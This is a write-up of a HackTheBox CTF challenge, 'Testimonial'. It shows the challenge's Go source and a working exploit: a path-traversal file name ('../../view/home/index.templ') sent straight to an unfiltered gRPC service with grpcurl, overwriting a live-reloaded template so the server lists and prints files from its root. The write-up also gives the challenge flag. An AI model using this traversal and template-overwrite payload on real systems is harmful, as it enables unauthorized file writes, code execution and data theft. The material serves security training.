# Testimonial

## Description

As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction's hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.

## Analysis


::: details client.go
```go
package client

import (
	"context"
	"fmt"
	"htbchal/pb"
	"strings"
	"sync"

	"google.golang.org/grpc"
)

var (
	grpcClient *Client
	mutex      *sync.Mutex
)

func init() {
	grpcClient = nil
	mutex = &sync.Mutex{}
}

type Client struct {
	pb.RickyServiceClient
}

func GetClient() (*Client, error) {
	mutex.Lock()
	defer mutex.Unlock()

	if grpcClient == nil {
		conn, err := grpc.Dial(fmt.Sprintf("127.0.0.1%s", ":50045"), grpc.WithInsecure())
		if err != nil {
			return nil, err
		}

		grpcClient = &Client{pb.NewRickyServiceClient(conn)}
	}

	return grpcClient, nil
}

func (c *Client) SendTestimonial(customer, testimonial string) error {
	ctx := context.Background()
	// Filter bad characters.
	for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
		customer = strings.ReplaceAll(customer, char, "")
	}

	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}

func (c *Client) SendTestimonialNoFilters(customer, testimonial string) error {
	ctx := context.Background()
	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}
```
:::


::: details ptypes.proto
```proto
syntax = "proto3";

option go_package = "/pb";

service RickyService {
    rpc SubmitTestimonial(TestimonialSubmission) returns (GenericReply) {}
}

message TestimonialSubmission {
    string customer = 1;
    string testimonial = 2;
}

message GenericReply {
    string message = 1;
}
```
:::


::: details index.templ
```go
package home

import (
	"htbchal/view/layout"
	"io/fs"	
	"fmt"
	"os"
)

templ Index() {
	@layout.App(true) {
<nav class="navbar navbar-expand-lg navbar-dark bg-black">
  <div class="container-fluid">
    <a class="navbar-brand" href="/">The Fray</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
            aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
            <li class="nav-item active">
                <a class="nav-link" href="/">Home</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="javascript:void();">Factions</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="javascript:void();">Trials</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="javascript:void();">Contact</a>
            </li>
        </ul>
    </div>
  </div>
</nav>

<div class="container">
  <section class="jumbotron text-center">
      <div class="container mt-5">
          <h1 class="display-4">Welcome to The Fray</h1>
          <p class="lead">Assemble your faction and prove youre the last one standing!</p>
          <a href="javascript:void();" class="btn btn-primary btn-lg">Get Started</a>
      </div>
  </section>

  <section class="container mt-5">
      <h2 class="text-center mb-4">What Others Say</h2>
      <div class="row">
          @Testimonials()
      </div>
  </section>


  <div class="row mt-5 mb-5">
    <div class="col-md">
      <h2 class="text-center mb-4">Submit Your Testimonial</h2>
      <form method="get" action="/">
        <div class="form-group">
          <label class="mt-2" for="testimonialText">Your Testimonial</label>
          <textarea class="form-control mt-2" id="testimonialText" rows="3" name="testimonial"></textarea>
        </div>
        <div class="form-group">
          <label class="mt-2" for="testifierName">Your Name</label>
          <input type="text" class="form-control mt-2" id="testifierName" name="customer"/>
        </div>
        <button type="submit" class="btn btn-primary mt-4">Submit Testimonial</button>
      </form>
    </div>
  </div>
</div>

<footer class="bg-black text-white text-center py-3">
    <p>&copy; 2024 The Fray. All Rights Reserved.</p>
</footer>
	}
}

func GetTestimonials() []string {
	fsys := os.DirFS("public/testimonials")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

templ Testimonials() {
  for _, item := range GetTestimonials() {
    <div class="col-md-4">
        <div class="card mb-4">
            <div class="card-body">
                <p class="card-text">"{item}"</p>
                <p class="text-muted">- Anonymous Testifier</p>
            </div>
        </div>
    </div>
  }
}
```
:::


::: details main.go
```go
package main

import (
	"embed"
	"htbchal/handler"
	"htbchal/pb"
	"log"
	"net"
	"net/http"

	"github.com/go-chi/chi/v5"
	"google.golang.org/grpc"
)

//go:embed public
var FS embed.FS

func main() {
	router := chi.NewMux()

	router.Handle("/*", http.StripPrefix("/", http.FileServer(http.FS(FS))))
	router.Get("/", handler.MakeHandler(handler.HandleHomeIndex))
	go startGRPC()
	log.Fatal(http.ListenAndServe(":1337", router))
}

type server struct {
	pb.RickyServiceServer
}

func startGRPC() error {
	lis, err := net.Listen("tcp", ":50045")
	if err != nil {
		log.Fatal(err)
	}
	s := grpc.NewServer()

	pb.RegisterRickyServiceServer(s, &server{})
	if err := s.Serve(lis); err != nil {
		log.Fatal(err)
	}
	return nil
}

```
:::


::: details grpc.go
```go
package main

import (
	"context"
	"errors"
	"fmt"
	"htbchal/pb"
	"os"
)

func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
	if req.Customer == "" {
		return nil, errors.New("Name is required")
	}
	if req.Testimonial == "" {
		return nil, errors.New("Content is required")
	}

	err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
	if err != nil {
		return nil, err
	}

	return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
}

```
:::


::: details Dockerfile
```bash
FROM golang:1.22-alpine3.18

WORKDIR /challenge/

COPY ./challenge/ /challenge/

COPY ./flag.txt /flag.txt

RUN go mod download -x \
 && go install github.com/cosmtrek/air@latest \
 && go install github.com/a-h/templ/cmd/templ@latest

EXPOSE 1337
EXPOSE 50045

COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]

```
:::


::: details entrypoint.sh
```bash
#!/bin/sh

# Change flag name
mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt

# Secure entrypoint
chmod 600 /entrypoint.sh

# Start application
air
```
:::


There's many things to consider in this (somewhat) simple app.
1. There are 2 services, HTTP and GRPC.
    * Both are exposed to outside world
    * HTTP does validation and sends request to GRPC
    * Nothing stops us by directly interacting with GRPC
2. LFI in GRPC
    * `err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)`
    * HTTP filters our name, but GRPC doesnt. This introduces LFI vulnerability.
    * We can write files anywhere, but yet not read.
3. GRPC doesnt support direct interaction.
    * Error: `Failed to list services: server does not support the reflection API`
    * But since we have access to proto files, we are able to make it interactive.
4. Application is deployed using [air](https://github.com/cosmtrek/air)
    * ☁️ Air - Live reload for Go apps
    * Live reload will regenerate files is it detects change.

Because `air` will regenerate files on change we can send GRPC server such file that it will render contents when accessed. There's only 1 view so we will change `index.templ` with our code and execute it.

To interact with GRPC server I used [grpcurl](https://github.com/fullstorydev/grpcurl).

```bash
└─$ grpcurl -plaintext -vv 83.136.248.119:57007 list
Failed to list services: server does not support the reflection API

└─$ grpcurl -plaintext -import-path ./challenge/pb -proto ./challenge/pb/ptypes.proto -vv 83.136.248.119:57007 list
RickyService

└─$ grpcurl -plaintext -import-path ./challenge/pb -proto ./challenge/pb/ptypes.proto -vv 83.136.248.119:57007 describe RickyService
RickyService is a service:
service RickyService {
  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
}
```

We need to send request to `RickyService.SubmitTestimonial` to overwrite the file. Since we are overwriting `index.templ` I mainly copy pasted same thing, deleted some markup and changed what golang should render.

```go
package home

import (
	"htbchal/view/layout"
	"io/fs"	
	"fmt"
	"os"
)

templ Index() {
	@layout.App(true) { 
		<main class="container mt-5">
				@Testimonials()
		</main>
	}
}

func GetTestimonials() []string {
	fsys := os.DirFS("/") // Get files from root
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, err := fs.ReadFile(fsys, file.Name())
		if err != nil { continue }
		res = append(res, string(fileContent))		
	}
	return res
}

templ Testimonials() {
  for _, item := range GetTestimonials() {
	<div class="card-body">
		<p class="card-text">"{item}"</p>
		<p class="text-muted">- Anonymous Testifier</p>
	</div>
  }
}
```

Convert the template to oneliner string: [Cyberchef Recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cn'%7D,'%5C%5C%5C%5Cn',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'"'%7D,'%5C%5C%5C%5C"',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cr'%7D,'',true,false,true,false)&input=cGFja2FnZSBob21lDQoNCmltcG9ydCAoDQoJImh0YmNoYWwvdmlldy9sYXlvdXQiDQoJImlvL2ZzIgkNCgkiZm10Ig0KCSJvcyINCikNCg0KdGVtcGwgSW5kZXgoKSB7DQoJQGxheW91dC5BcHAodHJ1ZSkgeyANCgkJPG1haW4gY2xhc3M9ImNvbnRhaW5lciBtdC01Ij4NCgkJCQlAVGVzdGltb25pYWxzKCkNCgkJPC9tYWluPg0KCX0NCn0NCg0KZnVuYyBHZXRUZXN0aW1vbmlhbHMoKSBbXXN0cmluZyB7DQoJZnN5cyA6PSBvcy5EaXJGUygiLyIpCQ0KCWZpbGVzLCBlcnIgOj0gZnMuUmVhZERpcihmc3lzLCAiLiIpCQkNCglpZiBlcnIgIT0gbmlsIHsNCgkJcmV0dXJuIFtdc3RyaW5ne2ZtdC5TcHJpbnRmKCJFcnJvciByZWFkaW5nIHRlc3RpbW9uaWFsczogJXYiLCBlcnIpfQ0KCX0NCgl2YXIgcmVzIFtdc3RyaW5nDQoJZm9yIF8sIGZpbGUgOj0gcmFuZ2UgZmlsZXMgew0KCQlmaWxlQ29udGVudCwgZXJyIDo9IGZzLlJlYWRGaWxlKGZzeXMsIGZpbGUuTmFtZSgpKQ0KCQlpZiBlcnIgIT0gbmlsIHsgY29udGludWUgfQ0KCQlyZXMgPSBhcHBlbmQocmVzLCBzdHJpbmcoZmlsZUNvbnRlbnQpKQkJDQoJfQ0KCXJldHVybiByZXMNCn0NCg0KdGVtcGwgVGVzdGltb25pYWxzKCkgew0KICBmb3IgXywgaXRlbSA6PSByYW5nZSBHZXRUZXN0aW1vbmlhbHMoKSB7DQoJPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCgkJPHAgY2xhc3M9ImNhcmQtdGV4dCI%2BIntpdGVtfSI8L3A%2BDQoJCTxwIGNsYXNzPSJ0ZXh0LW11dGVkIj4tIEFub255bW91cyBUZXN0aWZpZXI8L3A%2BDQoJPC9kaXY%2BDQogIH0NCn0&ieol=%0D%0A)

![testimonial-1](/assets/ctf/htb/testimonial-1.png)

## Solution

* customer: `../../view/home/index.templ` (Filename to write to)
* testimonial: Oneliner template (What data to write)
* 83.136.248.119:57007: GRPC_SERVER:PORT
* RickyService.SubmitTestimonial: Endpoint

```bash
└─$ grpcurl -plaintext -import-path ./challenge/pb -proto ./challenge/pb/ptypes.proto -format text -d 'customer: "../../view/home/index.templ", testimonial: "package home\n\nimport (\n        \"htbchal/view/layout\"\n  \"io/fs\"       \n      \"fmt\"\n       \"os\"\n)\n\ntempl Index() {\n  @layout.App(true) { \n          <main class=\"container mt-5\">\n                               @Testimonials()\n               </main>\n  }\n}\n\nfunc GetTestimonials() []string {\n     fsys := os.DirFS(\"/\") \n      files, err := fs.ReadDir(fsys, \".\")           \n      if err != nil {\n               return []string{fmt.Sprintf(\"Error reading testimonials: %v\", err)}\n    }\n     var res []string\n      for _, file := range files {\n          fileContent, err := fs.ReadFile(fsys, file.Name())\n            if err != nil { continue }\n
res = append(res, string(fileContent))          \n      }\n     return res\n}\n\ntempl Testimonials() {\n  for _, item := range GetTestimonials() {\n   <div class=\"card-body\">\n             <p class=\"card-text\">\"{item}\"</p>\n            <p class=\"text-muted\">- Anonymous Testifier</p>\n     </div>\n     }\n}"' -vv 83.136.248.119:57007 RickyService.SubmitTestimonial

Resolved method descriptor:
rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc

Estimated response size: 36 bytes

Response contents:
message: "Testimonial submitted successfully"

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

![testimonial-2](/assets/ctf/htb/testimonial-2.png)
::: tip Flag
`HTB{w34kly_t35t3d_t3mplate5}`
:::